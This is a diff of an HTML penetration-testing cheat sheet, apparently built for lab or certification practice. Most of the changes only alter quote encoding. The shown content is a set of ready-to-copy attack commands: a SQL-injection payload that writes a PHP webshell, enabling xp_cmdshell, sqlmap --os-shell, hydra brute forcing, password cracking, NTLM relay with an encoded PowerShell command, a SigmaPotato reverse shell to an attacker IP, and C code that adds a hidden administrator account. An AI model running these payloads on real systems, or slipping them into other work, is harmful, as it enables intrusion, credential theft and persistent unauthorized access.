@@ -518,7 +518,7 @@ mark.hit{background:color-mix(in srgb,var(--amber) 45%,transparent);color:inheri
       <div class="doc-meta">
         <span>36 sections</span>
         <span>317 code blocks</span>
-        <span>updated 25 November 2026</span>
+        <span>updated 26 November 2026</span>
       </div>
       <div class="doc-actions">
         <button class="ghost" id="copyAll" type="button">Copy every command</button>
@@ -622,7 +622,7 @@ dig<span class="w"> </span>ns<span class="w"> </span>&lt;domain.tld&gt;<span cla
 <ul>
 <li>Connect to a share</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>smbclient<span class="w"> </span>//172.31.135.192/samba-share<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;&lt;username&gt;&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>smbclient<span class="w"> </span>//172.31.135.192/samba-share<span class="w"> </span>-U<span class="w"> </span><span class="s2">"&lt;username&gt;"</span>
 </pre></div>
 <ul>
 <li>Brute-forcing</li>
@@ -821,7 +821,7 @@ snmpwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> <
 <ul>
 <li>Send a POST body with curl</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;password&quot;:&quot;fake&quot;,&quot;username&quot;:&quot;admin&quot;}&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w">  </span>http://192.168.50.16:5002/users/v1/login
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-d<span class="w"> </span><span class="s1">'{"password":"fake","username":"admin"}'</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">'Content-Type: application/json'</span><span class="w">  </span>http://192.168.50.16:5002/users/v1/login
 </pre></div></div><div class="cs-sub" id="ffuf"><h3>ffuf</h3><ul>
 <li>ffuf GET</li>
 </ul>
@@ -831,7 +831,7 @@ snmpwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> <
 <ul>
 <li>ffuf POST</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ffuf<span class="w"> </span>-w<span class="w"> </span>words.txt<span class="w"> </span>-u<span class="w"> </span>http://SERVER_IP:PORT/login<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;username=admin&amp;password=FUZZ&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ffuf<span class="w"> </span>-w<span class="w"> </span>words.txt<span class="w"> </span>-u<span class="w"> </span>http://SERVER_IP:PORT/login<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-d<span class="w"> </span><span class="s1">'username=admin&amp;password=FUZZ'</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">'Content-Type: application/x-www-form-urlencoded'</span>
 </pre></div>
 <ul>
 <li>ffuf recursive fuzzing</li>
@@ -848,7 +848,7 @@ snmpwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> <
 <li>When fuzzing with a header, the response size is usually what you judge by</li>
 <li>The <code>fs</code> option filters by size</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ffuf<span class="w"> </span>-w<span class="w"> </span>/opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ<span class="w"> </span>-u<span class="w"> </span>http://academy.htb:PORT/<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Host: FUZZ.academy.htb&#39;</span><span class="w"> </span>-fs<span class="w"> </span><span class="m">900</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ffuf<span class="w"> </span>-w<span class="w"> </span>/opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ<span class="w"> </span>-u<span class="w"> </span>http://academy.htb:PORT/<span class="w"> </span>-H<span class="w"> </span><span class="s1">'Host: FUZZ.academy.htb'</span><span class="w"> </span>-fs<span class="w"> </span><span class="m">900</span>
 </pre></div></div><div class="cs-sub" id="medusa"><h3>Medusa</h3><ul>
 <li>Targeting a service</li>
 <li>The <code>-d</code> option lists the supported modules</li>
@@ -869,7 +869,7 @@ snmpwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> <
 </pre></div></div></section><section class="cs-sec" id="sql-injection" data-intro="sql injection"><h2>SQL Injection</h2><div class="cs-sub" id="mysql"><h3>mysql</h3><ul>
 <li>Connect to mysql</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>mysql<span class="w"> </span>-u<span class="w"> </span>root<span class="w"> </span>-p<span class="s1">&#39;root&#39;</span><span class="w"> </span>-h<span class="w"> </span><span class="m">192</span>.168.50.16<span class="w"> </span>-P<span class="w"> </span><span class="m">3306</span><span class="w"> </span>--skip-ssl-verify-server-cert
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>mysql<span class="w"> </span>-u<span class="w"> </span>root<span class="w"> </span>-p<span class="s1">'root'</span><span class="w"> </span>-h<span class="w"> </span><span class="m">192</span>.168.50.16<span class="w"> </span>-P<span class="w"> </span><span class="m">3306</span><span class="w"> </span>--skip-ssl-verify-server-cert
 </pre></div></div><div class="cs-sub" id="mssql"><h3>mssql</h3><ul>
 <li>Connect to mssql</li>
 </ul>
@@ -880,33 +880,33 @@ snmpwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> <
 <li>If it is set to a directory name, file operations are restricted to files in that directory</li>
 <li>If it is set to NULL, the feature is disabled</li>
 </ul>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">show</span><span class="w"> </span><span class="n">variables</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="ss">&quot;secure_file_priv&quot;</span><span class="p">;</span>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">show</span><span class="w"> </span><span class="n">variables</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="ss">"secure_file_priv"</span><span class="p">;</span>
 </pre></div>
 <ul>
 <li>Write a file to the web server with select into outfile</li>
 </ul>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="s1">&#39; UNION SELECT &quot;&lt;?php system($_GET[&#39;</span><span class="n">cmd</span><span class="err">&#39;</span><span class="p">]);</span><span class="o">?&gt;</span><span class="ss">&quot;, null, null, null, null INTO OUTFILE &quot;</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">webshell</span><span class="p">.</span><span class="n">php</span><span class="err">&quot;</span><span class="w"> </span><span class="c1">-- //</span>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="s1">' UNION SELECT "&lt;?php system($_GET['</span><span class="n">cmd</span><span class="err">'</span><span class="p">]);</span><span class="o">?&gt;</span><span class="ss">", null, null, null, null INTO OUTFILE "</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">webshell</span><span class="p">.</span><span class="n">php</span><span class="err">"</span><span class="w"> </span><span class="c1">-- //</span>
 </pre></div></div><div class="cs-sub" id="mssql-command-execute"><h3>mssql command execute</h3><ul>
 <li>Enable xp_cmdshell</li>
 </ul>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="n">impacket</span><span class="o">-</span><span class="n">mssqlclient</span><span class="w"> </span><span class="n">Administrator</span><span class="p">:</span><span class="n">Lab123</span><span class="o">@</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">50</span><span class="p">.</span><span class="mi">18</span><span class="w"> </span><span class="o">-</span><span class="n">windows</span><span class="o">-</span><span class="n">auth</span>
-<span class="k">EXECUTE</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="k">EXECUTE</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">'show advanced options'</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
 <span class="n">RECONFIGURE</span><span class="p">;</span>
-<span class="k">EXECUTE</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="k">EXECUTE</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">'xp_cmdshell'</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
 <span class="n">RECONFIGURE</span><span class="p">;</span>
 </pre></div>
 <ul>
 <li>Execute a shell command</li>
 </ul>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">EXECUTE</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;whoami&#39;</span><span class="p">;</span>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">EXECUTE</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">'whoami'</span><span class="p">;</span>
 </pre></div></div><div class="cs-sub" id="mysql-read-local-files"><h3>mysql read local files</h3><ul>
 <li>Read a local file</li>
 </ul>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">select</span><span class="w"> </span><span class="n">LOAD_FILE</span><span class="p">(</span><span class="ss">&quot;/etc/passwd&quot;</span><span class="p">);</span>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">select</span><span class="w"> </span><span class="n">LOAD_FILE</span><span class="p">(</span><span class="ss">"/etc/passwd"</span><span class="p">);</span>
 </pre></div></div><div class="cs-sub" id="mssql-read-local-files"><h3>mssql read local files</h3><ul>
 <li>Read a local file</li>
 </ul>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">OPENROWSET</span><span class="p">(</span><span class="n">BULK</span><span class="w"> </span><span class="n">N</span><span class="s1">&#39;C:/Windows/System32/drivers/etc/hosts&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">SINGLE_CLOB</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">Contents</span>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">OPENROWSET</span><span class="p">(</span><span class="n">BULK</span><span class="w"> </span><span class="n">N</span><span class="s1">'C:/Windows/System32/drivers/etc/hosts'</span><span class="p">,</span><span class="w"> </span><span class="n">SINGLE_CLOB</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">Contents</span>
 </pre></div></div><div class="cs-sub" id="sqlmap"><h3>sqlmap</h3><ul>
 <li>The <code>-u</code> option sets the URL to scan; <code>-p</code> selects the parameter</li>
 </ul>
@@ -915,7 +915,7 @@ snmpwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> <
 <ul>
 <li>POST request</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://127.0.0.1/login&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;username=test&amp;password=test&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">"http://127.0.0.1/login"</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">"username=test&amp;password=test"</span>
 </pre></div>
 <ul>
 <li>Use an HTTP request file</li>
@@ -948,25 +948,25 @@ KalioNix@htb[/htb]$ sqlmap -r req.txt</span></pre></div>
 <li><code>--dbs</code> → <code>--tables</code> → <code>--columns</code> → <code>--dump</code></li>
 </ul>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1"># 1. List databases</span>
-sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://127.0.0.1/vuln.php?id=1&quot;</span><span class="w"> </span>--dbs
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">"http://127.0.0.1/vuln.php?id=1"</span><span class="w"> </span>--dbs
 <span class="w"> </span>
 <span class="c1"># 2. List tables in a database</span>
-sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://127.0.0.1/vuln.php?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>testdb<span class="w"> </span>--tables
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">"http://127.0.0.1/vuln.php?id=1"</span><span class="w"> </span>-D<span class="w"> </span>testdb<span class="w"> </span>--tables
 <span class="w"> </span>
 <span class="c1"># 3. List columns in a table</span>
-sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://127.0.0.1/vuln.php?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>testdb<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>--columns
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">"http://127.0.0.1/vuln.php?id=1"</span><span class="w"> </span>-D<span class="w"> </span>testdb<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>--columns
 <span class="w"> </span>
 <span class="c1"># 4. Dump a table</span>
-sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://127.0.0.1/vuln.php?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>testdb<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>--dump
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">"http://127.0.0.1/vuln.php?id=1"</span><span class="w"> </span>-D<span class="w"> </span>testdb<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>--dump
 <span class="w"> </span>
 <span class="c1"># 5. Dump specific columns</span>
-sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://127.0.0.1/vuln.php?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>testdb<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>-C<span class="w"> </span><span class="s2">&quot;id,username&quot;</span><span class="w"> </span>--dump
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">"http://127.0.0.1/vuln.php?id=1"</span><span class="w"> </span>-D<span class="w"> </span>testdb<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>-C<span class="w"> </span><span class="s2">"id,username"</span><span class="w"> </span>--dump
 </pre></div>
 <ul>
 <li>command execute</li>
 <li><code>-r</code> points at a file containing the POST request; <code>--os-shell</code> gives command execution</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sqlmap<span class="w"> </span>-r<span class="w"> </span>post.txt<span class="w"> </span>-p<span class="w"> </span>item<span class="w">  </span>--os-shell<span class="w"> </span>--web-root<span class="w"> </span><span class="s2">&quot;/var/www/html/tmp&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sqlmap<span class="w"> </span>-r<span class="w"> </span>post.txt<span class="w"> </span>-p<span class="w"> </span>item<span class="w">  </span>--os-shell<span class="w"> </span>--web-root<span class="w"> </span><span class="s2">"/var/www/html/tmp"</span>
 </pre></div></div></section><section class="cs-sec" id="wordpress" data-intro="wordpress"><h2>wordpress</h2><div class="cs-sub" id="wpscan"><h3>wpscan</h3><ul>
 <li>Enumerate everything wpscan can find on the WordPress install</li>
 </ul>
@@ -1016,12 +1016,12 @@ sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> <
 <ul>
 <li>rdp</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>hydra<span class="w"> </span>-L<span class="w"> </span>/usr/share/wordlists/dirb/others/names.txt<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;SuperS3cure1337#&quot;</span><span class="w"> </span>rdp://192.168.50.202
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>hydra<span class="w"> </span>-L<span class="w"> </span>/usr/share/wordlists/dirb/others/names.txt<span class="w"> </span>-p<span class="w"> </span><span class="s2">"SuperS3cure1337#"</span><span class="w"> </span>rdp://192.168.50.202
 </pre></div>
 <ul>
 <li>http post</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>hydra<span class="w"> </span>-l<span class="w"> </span>user<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span><span class="m">192</span>.168.50.201<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/index.php:fm_usr=user&amp;fm_pwd=^PASS^:Login failed. Invalid&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>hydra<span class="w"> </span>-l<span class="w"> </span>user<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span><span class="m">192</span>.168.50.201<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">"/index.php:fm_usr=user&amp;fm_pwd=^PASS^:Login failed. Invalid"</span>
 </pre></div></div></section><section class="cs-sec" id="password-cracking" data-intro="password cracking"><h2>Password Cracking</h2><div class="cs-sub" id="hashcat"><h3>hashcat</h3><ul>
 <li>hashcat</li>
 <li>Rule location: <code>ls -la /usr/share/hashcat/rules/</code></li>
@@ -1083,7 +1083,7 @@ unshadow<span class="w"> </span>/tmp/passwd.bak<span class="w"> </span>/tmp/shad
 <ul>
 <li>Crack the ssh private key hash (john)</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sudo<span class="w"> </span>sh<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;cat /home/kali/passwordattacks/ssh.rule &gt;&gt; /etc/john/john.conf&#39;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sudo<span class="w"> </span>sh<span class="w"> </span>-c<span class="w"> </span><span class="s1">'cat /home/kali/passwordattacks/ssh.rule &gt;&gt; /etc/john/john.conf'</span>
 john<span class="w"> </span>--wordlist<span class="o">=</span>ssh.passwords<span class="w"> </span>--rules<span class="o">=</span>sshRules<span class="w"> </span>ssh.hash
 </pre></div></div></section><section class="cs-sec" id="working-with-password-hashes" data-intro="working with password hashes"><h2>Working with Password Hashes</h2><div class="cs-sub" id="windows-sam-system-security-cracking"><h3>Windows SAM, SYSTEM, SECURITY cracking</h3><ul>
 <li>Dump the sam, system and security registry hives</li>
@@ -1161,7 +1161,7 @@ privilege::debug</span></pre></div>
 <li><code>-t 192.168.50.212</code>: the target</li>
 <li><code>-c "powershell -enc ..."</code>: the command to run after a successful authentication</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>impacket-ntlmrelayx<span class="w"> </span>--no-http-server<span class="w"> </span>-smb2support<span class="w"> </span>-t<span class="w"> </span><span class="m">192</span>.168.50.212<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>impacket-ntlmrelayx<span class="w"> </span>--no-http-server<span class="w"> </span>-smb2support<span class="w"> </span>-t<span class="w"> </span><span class="m">192</span>.168.50.212<span class="w"> </span>-c<span class="w"> </span><span class="s2">"powershell -enc JABjAGwAaQBlAG4AdA..."</span>
 </pre></div></div><div class="cs-sub" id="windows-credential-protection"><h3>Windows credential protection</h3><ul>
 <li>Dump every credential mimikatz can reach</li>
 </ul>
@@ -1231,7 +1231,7 @@ PS C:\Users\dave&gt; Get-LocalGroup</span></pre></div>
 <ul>
 <li>Running services</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">get-service</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">DisplayName</span> <span class="o">-like</span> <span class="s1">&#39;Druva*&#39;</span><span class="p">}</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">get-service</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">DisplayName</span> <span class="o">-like</span> <span class="s1">'Druva*'</span><span class="p">}</span>
 </pre></div></div><div class="cs-sub" id="hidden-in-plain-view"><h3>Hidden in Plain View</h3><ul>
 <li>CMD - findstr</li>
 </ul>
@@ -1244,7 +1244,7 @@ PS C:\Users\dave&gt; Get-LocalGroup</span></pre></div>
 <ul>
 <li>PowerShell - Select-String</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">Get-ChildItem</span> <span class="n">-Recurse</span> <span class="n">-Path</span> <span class="n">N</span><span class="p">:\</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="s2">&quot;cred&quot;</span> <span class="n">-List</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">Get-ChildItem</span> <span class="n">-Recurse</span> <span class="n">-Path</span> <span class="n">N</span><span class="p">:\</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="s2">"cred"</span> <span class="n">-List</span>
 </pre></div>
 <ul>
 <li>Search for password manager databases</li>
@@ -1276,7 +1276,7 @@ PS C:\Users\dave&gt; Get-LocalGroup</span></pre></div>
 <ul>
 <li>Shell connection</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">192</span>.168.50.220<span class="w"> </span>-u<span class="w"> </span>daveadmin<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;qwertqwertqwert123\!\!&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">192</span>.168.50.220<span class="w"> </span>-u<span class="w"> </span>daveadmin<span class="w"> </span>-p<span class="w"> </span><span class="s2">"qwertqwertqwert123\!\!"</span>
 </pre></div></div><div class="cs-sub" id="automated-enumeration"><h3>Automated Enumeration</h3><ul>
 <li>winpeas</li>
 </ul>
@@ -1303,7 +1303,7 @@ PS C:\Users\dave&gt; Get-LocalGroup</span></pre></div>
 <ul>
 <li>Check Task Scheduler logs</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">Get-WinEvent</span> <span class="n">-LogName</span> <span class="s2">&quot;Microsoft-Windows-TaskScheduler/Operational&quot;</span> <span class="n">-MaxEvents</span> <span class="n">30</span> <span class="p">|</span> <span class="n">findstr</span> <span class="n">backup</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">Get-WinEvent</span> <span class="n">-LogName</span> <span class="s2">"Microsoft-Windows-TaskScheduler/Operational"</span> <span class="n">-MaxEvents</span> <span class="n">30</span> <span class="p">|</span> <span class="n">findstr</span> <span class="n">backup</span>
 </pre></div></div></section><section class="cs-sec" id="automated-escalation" data-intro="automated escalation"><h2>Automated Escalation</h2><div class="cs-sub" id="printspoofer"><h3>PrintSpoofer</h3><p>Works when SeImpersonatePrivilege is held and the Print Spooler service (spoolsv.exe) is running</p>
 <ul>
 <li>Execute a command</li>
@@ -1321,7 +1321,7 @@ PS C:\Users\dave&gt; Get-LocalGroup</span></pre></div>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="plain">.\SigmaPotato.exe --revshell 192.168.45.155 4444</span></pre></div></div></section><section class="cs-sec" id="abusing-windows-services" data-intro="abusing windows services"><h2>Abusing Windows Services</h2><div class="cs-sub" id="service-binary-hijacking"><h3>Service binary hijacking</h3><ul>
 <li>List services with their binary paths</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span><span class="n">State</span><span class="p">,</span><span class="n">PathName</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">State</span> <span class="o">-like</span> <span class="s1">&#39;Running&#39;</span><span class="p">}</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span><span class="n">State</span><span class="p">,</span><span class="n">PathName</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">State</span> <span class="o">-like</span> <span class="s1">'Running'</span><span class="p">}</span>
 </pre></div>
 <ul>
 <li>Print binary permissions</li>
@@ -1336,8 +1336,8 @@ PS C:\Users\dave&gt; Get-LocalGroup</span></pre></div>
 <span class="p">{</span>
 <span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
 <span class="w">  </span>
-<span class="w">  </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;net user dave2 password123! /add&quot;</span><span class="p">);</span>
-<span class="w">  </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;net localgroup administrators dave2 /add&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="p">(</span><span class="s">"net user dave2 password123! /add"</span><span class="p">);</span>
+<span class="w">  </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="p">(</span><span class="s">"net localgroup administrators dave2 /add"</span><span class="p">);</span>
 <span class="w">  </span>
 <span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
@@ -1350,7 +1350,7 @@ PS C:\Users\dave&gt; Get-LocalGroup</span></pre></div>
 <ul>
 <li>Check the service start type</li>
 </ul>
